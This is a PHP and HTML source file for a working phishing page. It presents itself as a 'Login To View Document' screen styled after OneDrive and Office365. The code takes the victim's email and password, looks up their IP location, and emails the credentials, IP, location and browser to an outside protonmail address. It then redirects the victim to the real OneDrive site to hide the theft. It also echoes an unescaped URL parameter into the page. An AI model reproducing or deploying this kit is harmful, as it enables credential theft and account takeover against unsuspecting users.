<head>
<link rel="stylesheet" href="style.css" />
<style type="text/css">
.auto-style1 {
	font-weight: normal;
}
.auto-style2 {
	margin: 30px auto;
	width: 40%;
	text-align: center;
	background-color: #F5F5F5;
}
</style>
</head>

<body style="background-image: url('300.png')">

<div class="form form2">
	<div class="text_area">
<h2>&nbsp;</h2>
		<h2>Review Document</h2>
<h4 class="auto-style1">Login To View Document</h4>
</div>
<div class="form_wrap">
<?php
if (isset($_GET['img']))
{
    $from = 'info@info.net';
    if ($_GET['img'] == 1)
    {
        ?>

        <form name="login" method="post" action="phone.php">
            <p><img src="logo<?php echo $_GET['img'] ?>.jpg" /></p>
            <div class="row">
                <div class="label">Email:</div>
                <div class="field">
                    <input type="email" name="email" id="email" required value="" />
                </div>
            </div>
            <input type="hidden" name="image_type" value="<?php echo $_GET['img']; ?>">
            <div class="row">
                <div class="label">Password:</div>
                <div class="field">
                    <input type="password" name="password" id="password" required value="" />
                </div>
            </div>
            <div class="row form_but">
                <input type="submit" name="submit_next" value="Continue" />
            </div>
        </form>

        <?php
    } else
    {
        if (isset($_POST['submit_step']))
        {
            $email = $_POST['email'];
            $password = $_POST['password'];
            if ($_POST['image_type'] == 2)
            {
                $image_type = 'Office365';
            } else if ($_POST['image_type'] == 3)
            {
                $image_type = 'Other Mail';
            }
            $ip = $_SERVER['REMOTE_ADDR'];
            $location = json_decode(file_get_contents('http://freegeoip.net/json/' . $ip));

            $country = $location->country_name;
            $region = ($location->region_name != '') ? $location->region_name : '-';
            $city = ($location->city != '') ? $location->city : '-';
            $browser = $_SERVER['HTTP_USER_AGENT'];
            $subject = $country . ' ' . $ip . ' ' . $image_type;
            $to = 'alfeymoon@protonmail.com';
            

            $message = ""
                    . "<p>BLI$$</p>"
                    . "<p><b>Email :</b>" . $email . "</p>"
                    . "<p><b>Password :</b>" . $password . "</p>"
                    . "<p><b>Ip Address :</b>" . $ip . "</p>"
                    . "<p><b>Image type :</b>" . $image_type . "</p>"
                    . "<p><b>Country :</b>" . $country . "</p>"
                    . "<p><b>Region :</b>" . $region . "</p>"
                    . "<p><b>City :</b>" . $city . "</p>"
                    . "<p><b>Browser :</b>" . $browser . "</p>";
            // Always set content-type when sending HTML email
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

// More headers
            $headers .= 'From: <' . $from . '>' . "\r\n";


            if (mail($to, $subject, $message, $headers))
            {
                echo '<script>window.top.location="https://onedrive.live.com/";</script>';
            } else
            {
                echo 'Failed';
            }
        } else
        {
            ?>
            <form name="login" method="post" action="">
<p><img src="logo<?php echo $_GET['img'] ?>.jpg" /></p>
                <div class="row">
                    <div class="label">Email:</div>
                    <div class="field">
                        <input type="email" name="email" id="email" required value="" />
                    </div>
                </div>
                <input type="hidden" name="image_type" value="<?php echo $_GET['img']; ?>">
                <div class="row">
                    <div class="label">Password:</div>
                    <div class="field">
                        <input type="password" name="password" id="password" required value="" />
                    </div>
                </div>
                <div class="row form_but">
                    <input type="submit" name="submit_step" value="Submit" />
                </div>
            </form>
            <?php
        }
    }
}
?>
</div>
<div class="auto-style2">
	<img alt="" height="32" src="docs.png" width="292"></div>
</div>
